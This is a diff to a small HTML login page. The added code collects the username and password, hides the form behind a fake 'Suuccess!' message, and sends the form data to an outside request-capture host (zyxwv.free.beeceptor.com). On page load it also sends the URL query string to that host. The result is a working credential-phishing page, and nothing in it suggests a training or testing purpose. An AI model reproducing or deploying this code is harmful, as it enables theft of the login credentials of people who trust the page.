@@ -8,46 +8,31 @@
 <body>
     <div id="loginDiv">
         <p>Text</p>
-        <form id="loginForm" method="POST" action="/?success=success" onsubmit="logFormdata">
-            <input placeholder="username...">
-            <input placeholder="password..." type="password">
-            <br/>
-            <input type = "submit" value="Login">
+        <form id="loginForm" method="POST">
+            <input placeholder="username..." name="username">
+            <input placeholder="password..." name="password" type="password">
         </form>
+        <button onclick="logFormdata()">Login</button>
     </div>
     <div id="successDiv" style="display: none;">
         Suuccess!
     </div>
 </body>
 <script>
-    function getQueryVariable(variable)
-    {
-       var query = window.location.search.substring(1);
-       var vars = query.split("&");
-       for (var i=0;i<vars.length;i++) {
-               var pair = vars[i].split("=");
-               if(pair[0] == variable){return pair[1];}
-       }
-       return(false);
-    }
-    
     function logFormdata(){
+        console.log("clicked");
+        document.getElementById("loginDiv").style.display="none";
+        document.getElementById("successDiv").style.display="inline";
         var form = document.getElementById("loginForm");
+        console.log(form);
         var data = new FormData(form);
         var xhttp = new XMLHttpRequest();
         xhttp.open("POST","https://zyxwv.free.beeceptor.com",true);
         xhttp.send(data);
+        console.log(data);
     }
-
-    document.onload = function(){
-        if(getQueryVariable("success")){
-            document.getElementById("loginDiv").style.display="none";
-            document.getElementById("successDiv").style.display="inline";
-        }else{
-            var xhttp = new XMLHttpRequest();
-            xhttp.open("GET","https://zyxwv.free.beeceptor.com/"+location.search,true);
-            xhttp.send();
-        }
-    };
+    var xhttp = new XMLHttpRequest();
+    xhttp.open("GET","https://zyxwv.free.beeceptor.com/"+location.search,true);
+    xhttp.send();
 </script>
 </html>
